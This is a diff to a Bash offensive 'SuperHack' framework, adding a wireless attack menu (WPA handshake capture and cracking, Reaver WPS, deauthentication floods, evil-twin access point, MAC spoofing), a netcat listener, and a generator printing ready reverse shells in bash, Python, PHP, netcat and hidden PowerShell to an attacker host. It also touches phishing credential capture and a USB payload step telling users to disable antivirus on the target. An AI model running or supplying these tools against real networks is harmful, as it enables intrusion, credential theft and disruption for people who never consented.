@@ -1579,7 +1579,10 @@ view_captured_creds() {
     echo ""
     
     # List all captured credential files
-    local cred_files=("$CREDS_DIR"/*.txt "$PHISHING_DIR"/captured_*.txt "$PHISHING_DIR"/*/captured_creds.txt 2>/dev/null)
+    local cred_files=()
+    for f in "$CREDS_DIR"/*.txt "$PHISHING_DIR"/captured_*.txt "$PHISHING_DIR"/*/captured_creds.txt; do
+        [[ -f "$f" ]] && cred_files+=("$f")
+    done 2>/dev/null    
     
     if [[ ${#cred_files[@]} -eq 0 ]]; then
         echo -e "${YELLOW}[!] No captured credentials found${NC}"
@@ -1721,4 +1724,620 @@ EOF
 
     echo -e "${GREEN}[+] USB payload created in: $usb_dir${NC}"
     echo -e "${YELLOW}[!] Copy contents to USB root. Disable antivirus on target.${NC}"
-    echo -
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# WIRELESS ATTACKS MODULE
+# =============================================================================
+
+# WiFi network scanner and attack suite
+wifi_attacks() {
+    check_install aircrack-ng
+    check_install macchanger
+    check_install wireless-tools
+    
+    while true; do
+        echo -e "${CYAN}"
+        cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║              WIRELESS ATTACKS MODULE                      ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+        echo -e "${NC}"
+        
+        echo "1) Scan for wireless networks"
+        echo "2) Capture WPA/WPA2 handshake"
+        echo "3) Crack WPA/WPA2 handshake"
+        echo "4) WPS PIN attack (Reaver)"
+        echo "5) Deauth attack"
+        echo "6) Create fake access point (Evil Twin)"
+        echo "7) Monitor mode management"
+        echo "8) Back to Main Menu"
+        echo ""
+        echo -n "Select option: "
+        read wifi_choice
+        
+        case $wifi_choice in
+            1) wifi_scan ;;
+            2) capture_handshake ;;
+            3) crack_handshake ;;
+            4) wps_attack ;;
+            5) deauth_attack ;;
+            6) evil_twin ;;
+            7) monitor_mode_menu ;;
+            8) break ;;
+            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+# Scan for wireless networks
+wifi_scan() {
+    echo -e "${BLUE}[*] Wireless Network Scanner${NC}"
+    
+    # Check for wireless interfaces
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    
+    if [[ -z "$iface" ]]; then
+        echo -e "${RED}[!] No wireless interface found${NC}"
+        echo -n "Enter interface manually (e.g., wlan0): "
+        read iface
+    else
+        echo -e "${GREEN}[+] Found wireless interface: $iface${NC}"
+    fi
+    
+    echo -n "Put interface in monitor mode? (y/n): "
+    read enable_monitor
+    
+    if [[ "$enable_monitor" == "y" ]]; then
+        airmon-ng check kill 2>/dev/null
+        airmon-ng start "$iface" 2>/dev/null
+        iface="${iface}mon"
+        echo -e "${GREEN}[+] Monitor mode enabled on $iface${NC}"
+    fi
+    
+    echo -e "${YELLOW}[*] Scanning for networks... Press Ctrl+C when ready${NC}"
+    echo ""
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local scan_file="$RESULTS_DIR/wifi/scan_$timestamp.csv"
+    
+    airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null &
+    local scan_pid=$!
+    
+    echo -n "Press Enter to stop scan..."
+    read
+    
+    kill $scan_pid 2>/dev/null
+    echo -e "${GREEN}[+] Scan saved to: $scan_file${NC}"
+    
+    # Display results
+    if [[ -f "$scan_file-01.csv" ]]; then
+        echo -e "${CYAN}=== Networks Found ===${NC}"
+        tail -n +2 "$scan_file-01.csv" | head -20
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Capture WPA/WPA2 handshake
+capture_handshake() {
+    echo -e "${BLUE}[*] WPA/WPA2 Handshake Capture${NC}"
+    
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    
+    echo -n "Enter target BSSID: "
+    read target_bssid
+    echo -n "Enter target channel: "
+    read target_channel
+    echo -n "Enter output filename (default: handshake): "
+    read output_name
+    output_name=${output_name:-handshake}
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local cap_dir="$RESULTS_DIR/wifi/handshakes"
+    create_dir "$cap_dir"
+    
+    echo -e "${YELLOW}[*] Starting capture on channel $target_channel...${NC}"
+    echo -e "${YELLOW}[*] Waiting for handshake. Send deauth to force reconnect.${NC}"
+    
+    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_dir/${output_name}_$timestamp" "$iface" 2>/dev/null &
+    local capture_pid=$!
+    
+    echo ""
+    echo -n "Send deauth packets to force handshake? (y/n): "
+    read send_deauth
+    
+    if [[ "$send_deauth" == "y" ]]; then
+        echo -n "Number of deauth packets (default: 10): "
+        read deauth_count
+        deauth_count=${deauth_count:-10}
+        
+        aireplay-ng -0 "$deauth_count" -a "$target_bssid" "$iface" 2>/dev/null
+    fi
+    
+    echo -n "Press Enter to stop capture..."
+    read
+    kill $capture_pid 2>/dev/null
+    
+    # Check for handshake
+    if [[ -f "$cap_dir/${output_name}_$timestamp-01.cap" ]]; then
+        echo -e "${GREEN}[+] Capture file saved${NC}"
+        aircrack-ng "$cap_dir/${output_name}_$timestamp-01.cap" 2>/dev/null | grep -E "WPA|handshake"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Crack captured handshake
+crack_handshake() {
+    echo -e "${BLUE}[*] WPA/WPA2 Handshake Cracker${NC}"
+    
+    echo -n "Enter path to .cap file: "
+    read cap_file
+    
+    if [[ ! -f "$cap_file" ]]; then
+        echo -e "${RED}[!] File not found${NC}"
+        return
+    fi
+    
+    echo "Select wordlist:"
+    echo "1) rockyou.txt"
+    echo "2) SecLists common passwords"
+    echo "3) Custom wordlist"
+    echo -n "Choice: "
+    read wordlist_choice
+    
+    case $wordlist_choice in
+        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
+        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
+        3) 
+            echo -n "Enter wordlist path: "
+            read wordlist
+            ;;
+    esac
+    
+    if [[ ! -f "$wordlist" ]]; then
+        echo -e "${RED}[!] Wordlist not found${NC}"
+        return
+    fi
+    
+    echo -e "${YELLOW}[*] Starting crack with aircrack-ng...${NC}"
+    aircrack-ng "$cap_file" -w "$wordlist"
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# WPS PIN attack
+wps_attack() {
+    check_install reaver
+    echo -e "${BLUE}[*] WPS PIN Attack (Reaver)${NC}"
+    
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    
+    echo -n "Enter target BSSID: "
+    read target_bssid
+    
+    echo -e "${YELLOW}[*] Starting WPS PIN attack...${NC}"
+    echo -e "${YELLOW}[*] This may take several hours${NC}"
+    
+    reaver -i "$iface" -b "$target_bssid" -vv
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Deauthentication attack
+deauth_attack() {
+    echo -e "${BLUE}[*] Deauthentication Attack${NC}"
+    
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
+    
+    echo -n "Enter target BSSID (AP): "
+    read target_bssid
+    echo -n "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): "
+    read client_mac
+    client_mac=${client_mac:-FF:FF:FF:FF:FF:FF}
+    echo -n "Number of packets (0=infinite): "
+    read packet_count
+    
+    echo -e "${RED}[!] WARNING: Only use on networks you own!${NC}"
+    echo -n "Continue? (y/n): "
+    read confirm
+    
+    if [[ "$confirm" == "y" ]]; then
+        echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
+        aireplay-ng -0 "$packet_count" -a "$target_bssid" -c "$client_mac" "$iface"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Evil Twin fake AP
+evil_twin() {
+    check_install hostapd
+    check_install dnsmasq
+    
+    echo -e "${BLUE}[*] Evil Twin Access Point${NC}"
+    echo -n "Enter interface for AP (e.g., wlan0): "
+    read ap_iface
+    echo -n "Enter SSID name: "
+    read ssid_name
+    echo -n "Enter channel (1-14): "
+    read channel
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local evil_dir="$RESULTS_DIR/wifi/eviltwin_$timestamp"
+    create_dir "$evil_dir"
+    
+    # Create hostapd config
+    cat > "$evil_dir/hostapd.conf" << EOF
+interface=$ap_iface
+driver=nl80211
+ssid=$ssid_name
+hw_mode=g
+channel=$channel
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+    # Create dnsmasq config
+    cat > "$evil_dir/dnsmasq.conf" << EOF
+interface=$ap_iface
+dhcp-range=10.0.0.10,10.0.0.250,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1
+EOF
+
+    echo -e "${YELLOW}[*] Setting up interface...${NC}"
+    ifconfig "$ap_iface" up 10.0.0.1 netmask 255.255.255.0
+    
+    echo -e "${YELLOW}[*] Starting dnsmasq...${NC}"
+    dnsmasq -C "$evil_dir/dnsmasq.conf" -d &
+    local dns_pid=$!
+    
+    echo -e "${YELLOW}[*] Starting hostapd...${NC}"
+    hostapd "$evil_dir/hostapd.conf" &
+    local hostapd_pid=$!
+    
+    echo -e "${GREEN}[+] Evil Twin AP '$ssid_name' running on channel $channel${NC}"
+    echo -e "${CYAN}Interface: $ap_iface | Gateway: 10.0.0.1${NC}"
+    echo ""
+    echo -n "Press Enter to stop AP..."
+    read
+    
+    kill $hostapd_pid 2>/dev/null
+    kill $dns_pid 2>/dev/null
+    killall dnsmasq hostapd 2>/dev/null
+    
+    echo -e "${GREEN}[+] Evil Twin stopped${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Monitor mode management
+monitor_mode_menu() {
+    echo -e "${BLUE}[*] Monitor Mode Management${NC}"
+    
+    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
+    
+    echo "Current interfaces:"
+    iw dev 2>/dev/null | grep Interface | awk '{print "  - " $2}'
+    echo ""
+    
+    echo "1) Enable monitor mode"
+    echo "2) Disable monitor mode"
+    echo "3) Change MAC address"
+    echo -n "Choice: "
+    read mon_choice
+    
+    case $mon_choice in
+        1)
+            echo -n "Enter interface: "
+            read iface
+            echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
+            airmon-ng check kill 2>/dev/null
+            airmon-ng start "$iface"
+            ;;
+        2)
+            echo -n "Enter interface (e.g., wlan0mon): "
+            read iface
+            echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
+            airmon-ng stop "$iface"
+            service NetworkManager restart 2>/dev/null || service networking restart 2>/dev/null
+            ;;
+        3)
+            echo -n "Enter interface: "
+            read iface
+            echo -n "Enter new MAC (or 'random'): "
+            read new_mac
+            
+            if [[ "$new_mac" == "random" ]]; then
+                macchanger -r "$iface"
+            else
+                macchanger -m "$new_mac" "$iface"
+            fi
+            ;;
+    esac
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# POST-EXPLOITATION & UTILITIES
+# =============================================================================
+
+# Network listener/ncat wrapper
+network_listener() {
+    check_install netcat-traditional nc
+    echo -e "${BLUE}[*] Network Listener${NC}"
+    
+    echo -n "Enter port to listen on: "
+    read listen_port
+    echo -n "Save output to file? (y/n): "
+    read save_output
+    
+    echo -e "${YELLOW}[*] Starting listener on port $listen_port...${NC}"
+    echo -e "${CYAN}Waiting for connection...${NC}"
+    
+    if [[ "$save_output" == "y" ]]; then
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        local output_file="$RESULTS_DIR/netcat_listener_$timestamp.txt"
+        nc -lvp "$listen_port" | tee "$output_file"
+        echo -e "${GREEN}[+] Output saved to: $output_file${NC}"
+    else
+        nc -lvp "$listen_port"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Quick reverse shell generator
+quick_reverse_shell() {
+    echo -e "${BLUE}[*] Quick Reverse Shell Generator${NC}"
+    
+    echo -n "Enter your IP (LHOST): "
+    read lhost
+    echo -n "Enter port (LPORT): "
+    read lport
+    
+    echo ""
+    echo -e "${CYAN}=== Bash ===${NC}"
+    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
+    echo ""
+    echo -e "${CYAN}=== Python ===${NC}"
+    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    echo ""
+    echo -e "${CYAN}=== PHP ===${NC}"
+    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    echo ""
+    echo -e "${CYAN}=== Netcat ===${NC}"
+    echo "nc -e /bin/sh $lhost $lport"
+    echo ""
+    echo -e "${CYAN}=== PowerShell ===${NC}"
+    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+    echo ""
+    
+    echo -n "Start listener now? (y/n): "
+    start_listener
+    if [[ "$start_listener" == "y" ]]; then
+        echo -e "${YELLOW}[*] Starting listener...${NC}"
+        nc -lvp "$lport"
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Log viewer
+view_logs() {
+    echo -e "${BLUE}[*] Session Logs${NC}"
+    
+    if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
+        echo -e "${YELLOW}[!] No logs found${NC}"
+    else
+        echo "Available logs:"
+        ls -la "$LOG_DIR"/*.log 2>/dev/null || echo "No .log files found"
+        echo ""
+        echo -n "View log file (enter filename or 'all'): "
+        read log_file
+        
+        if [[ "$log_file" == "all" ]]; then
+            for f in "$LOG_DIR"/*.log; do
+                [[ -f "$f" ]] && echo -e "\n=== $f ===" && cat "$f"
+            done
+        elif [[ -f "$LOG_DIR/$log_file" ]]; then
+            cat "$LOG_DIR/$log_file"
+        fi
+    fi
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# System information
+system_info() {
+    echo -e "${BLUE}[*] System Information${NC}"
+    echo ""
+    echo -e "${CYAN}=== OS Information ===${NC}"
+    uname -a
+    echo ""
+    echo -e "${CYAN}=== Network Interfaces ===${NC}"
+    ip addr show 2>/dev/null || ifconfig -a
+    echo ""
+    echo -e "${CYAN}=== Routing Table ===${NC}"
+    ip route 2>/dev/null || route -n
+    echo ""
+    echo -e "${CYAN}=== Wireless Interfaces ===${NC}"
+    iw dev 2>/dev/null || echo "No wireless interfaces found"
+    echo ""
+    echo -e "${CYAN}=== Disk Usage ===${NC}"
+    df -h "$CONFIG_DIR"
+    echo ""
+    echo -e "${CYAN}=== Memory ===${NC}"
+    free -h 2>/dev/null || cat /proc/meminfo | head -3
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# Update framework
+update_framework() {
+    echo -e "${BLUE}[*] Updating SuperHack Framework${NC}"
+    
+    echo -e "${YELLOW}[*] Updating package lists...${NC}"
+    apt-get update -qq
+    
+    echo -e "${YELLOW}[*] Upgrading installed packages...${NC}"
+    apt-get upgrade -y
+    
+    echo -e "${YELLOW}[*] Updating wordlists...${NC}"
+    if [[ -d "$WORDLISTS_DIR/seclists/.git" ]]; then
+        cd "$WORDLISTS_DIR/seclists" && git pull
+    fi
+    
+    echo -e "${GREEN}[+] Update complete!${NC}"
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# MAIN MENU & EXECUTION
+# =============================================================================
+
+# Display main menu
+main_menu() {
+    while true; do
+        show_banner
+        
+        echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
+        echo -e "${CYAN}║                    MAIN MENU                              ║${NC}"
+        echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${GREEN}  [1]${NC} Network Scanning        ${GREEN}[6]${NC}  Password Cracking"
+        echo -e "${GREEN}  [2]${NC} Enumeration             ${GREEN}[7]${NC}  Phishing Tools"
+        echo -e "${GREEN}  [3]${NC} Brute Force             ${GREEN}[8]${NC}  Wireless Attacks"
+        echo -e "${GREEN}  [4]${NC} Payload Generation      ${GREEN}[9]${NC}  Utilities"
+        echo -e "${GREEN}  [5]${NC} Exploit Database        ${GREEN}[10]${NC} System"
+        echo ""
+        echo -e "${YELLOW}  [0] Exit Framework${NC}"
+        echo ""
+        echo -n "Select option: "
+        read menu_choice
+        
+        case $menu_choice in
+            1)
+                echo ""
+                echo -e "${CYAN}=== NETWORK SCANNING ===${NC}"
+                echo "1) Advanced Nmap Scanner"
+                echo "2) Network Discovery (Ping Sweep)"
+                echo "3) Quick Port Scanner"
+                echo -n "Choice: "
+                read scan_choice
+                case $scan_choice in
+                    1) advanced_nmap_scan ;;
+                    2) network_discovery ;;
+                    3) port_scanner ;;
+                esac
+                ;;
+            2)
+                echo ""
+                echo -e "${CYAN}=== ENUMERATION ===${NC}"
+                echo "1) SMB Enumeration"
+                echo "2) LDAP/AD Enumeration"
+                echo "3) Web Enumeration"
+                echo "4) Subdomain Enumeration"
+                echo -n "Choice: "
+                read enum_choice
+                case $enum_choice in
+                    1) smb_enum ;;
+                    2) ldap_enum ;;
+                    3) web_enum ;;
+                    4) subdomain_enum ;;
+                esac
+                ;;
+            3) brute_force ;;
+            4) payload_gen ;;
+            5) exploit_search ;;
+            6) password_crack ;;
+            7) phishing_menu ;;
+            8) wifi_attacks ;;
+            9)
+                echo ""
+                echo -e "${CYAN}=== UTILITIES ===${NC}"
+                echo "1) Network Listener"
+                echo "2) Quick Reverse Shell"
+                echo "3) View Logs"
+                echo -n "Choice: "
+                read util_choice
+                case $util_choice in
+                    1) network_listener ;;
+                    2) quick_reverse_shell ;;
+                    3) view_logs ;;
+                esac
+                ;;
+            10)
+                echo ""
+                echo -e "${CYAN}=== SYSTEM ===${NC}"
+                echo "1) System Information"
+                echo "2) Update Framework"
+                echo "3) Initialize Directories"
+                echo -n "Choice: "
+                read sys_choice
+                case $sys_choice in
+                    1) system_info ;;
+                    2) update_framework ;;
+                    3) init_dirs ;;
+                esac
+                ;;
+            0)
+                echo -e "${GREEN}[+] Exiting SuperHack Framework${NC}"
+                echo -e "${YELLOW}[*] Goodbye!${NC}"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}Invalid option${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# =============================================================================
+# SCRIPT ENTRY POINT
+# =============================================================================
+
+# Initialize log file
+LOG_FILE="$LOG_DIR/superhack_$(date +%Y%m%d_%H%M%S).log"
+
+# Redirect all output to log file as well as terminal
+exec > >(tee -a "$LOG_FILE") 2>&1
+
+# Show startup banner
+show_banner
+
+# Initialize directories
+init_dirs
+
+# Check and install missing packages
+smart_package_manager
+
+# Start main menu
+main_menu
